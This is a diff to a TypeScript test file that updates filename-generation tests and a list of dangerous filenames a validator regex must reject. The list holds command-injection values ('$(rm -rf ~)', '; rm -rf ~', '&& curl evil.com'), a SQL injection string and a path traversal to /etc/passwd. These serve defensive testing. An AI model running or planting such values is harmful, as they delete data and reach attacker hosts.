@@ -65,9 +65,20 @@ describe('generateFilename', () => {
     }
   })
 
-  it('produces strictly screenshot-<ISO-stamp>.png shape', () => {
+  it('produces strictly screenshot-<ISO-stamp>-<ms>-<rand4>.png shape', () => {
     const f = generateFilename()
-    expect(f).toMatch(/^screenshot-\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}\.png$/)
+    expect(f).toMatch(/^screenshot-\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}-[0-9a-f]{4}\.png$/)
+  })
+
+  it('produces unique filenames for two calls in the same millisecond', () => {
+    // The random suffix is the only differentiator when ms collide; running
+    // generateFilename in a tight loop is the closest reproducer of the
+    // original collision.
+    const seen = new Set<string>()
+    for (let i = 0; i < 100; i++) {
+      seen.add(generateFilename())
+    }
+    expect(seen.size).toBe(100)
   })
 })
 
@@ -76,13 +87,15 @@ describe('SAFE_REMOTE_FILENAME_RE', () => {
     const dangerous = [
       'screenshot-$(rm -rf ~).png',
       'screenshot-`whoami`.png',
-      'screenshot-2026-05-01T12-00-00.png; rm -rf ~',
-      'screenshot-2026-05-01T12-00-00.png && curl evil.com',
+      'screenshot-2026-05-01T12-00-00-000-abcd.png; rm -rf ~',
+      'screenshot-2026-05-01T12-00-00-000-abcd.png && curl evil.com',
       "screenshot-' OR 1=1 --.png",
       '../../../etc/passwd',
       'screenshot.png',
       'screenshot-2026-05-01.png',
-      'screenshot-2026-05-01T12-00-00.PNG'
+      'screenshot-2026-05-01T12-00-00-000-ABCD.png', // upper hex rejected
+      'screenshot-2026-05-01T12-00-00.png', // old shape (no ms/suffix) rejected
+      'screenshot-2026-05-01T12-00-00-000-abcd.PNG'
     ]
     for (const f of dangerous) {
       expect(SAFE_REMOTE_FILENAME_RE.test(f), f).toBe(false)
@@ -90,7 +103,7 @@ describe('SAFE_REMOTE_FILENAME_RE', () => {
   })
 
   it('accepts the canonical generateFilename output', () => {
-    expect(SAFE_REMOTE_FILENAME_RE.test('screenshot-2026-05-01T12-34-56.png')).toBe(true)
+    expect(SAFE_REMOTE_FILENAME_RE.test('screenshot-2026-05-01T12-34-56-789-abcd.png')).toBe(true)
   })
 })
 
